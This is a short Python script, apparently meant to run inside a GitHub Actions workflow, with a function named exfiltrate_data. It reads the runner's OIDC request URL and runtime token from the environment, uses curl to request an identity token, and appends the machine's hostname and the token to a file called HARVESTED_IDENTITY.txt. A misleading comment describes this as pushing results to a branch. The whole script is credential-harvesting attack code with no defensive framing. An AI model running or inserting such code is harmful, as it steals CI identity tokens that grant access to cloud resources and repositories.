import os
import subprocess

def exfiltrate_data():
    # Capture results and push them to a protected branch
    token_url = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL")
    if token_url:
        # Request and save the token
        cmd = ["curl", "-s", "-H", f"Authorization: bearer {os.environ.get('ACTIONS_RUNTIME_TOKEN')}", token_url]
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        # Save to a persistent file
        with open("HARVESTED_IDENTITY.txt", "a") as f:
            f.write(f"{os.uname()[1]}: {result.stdout}\n")

if __name__ == "__main__":
    exfiltrate_data()
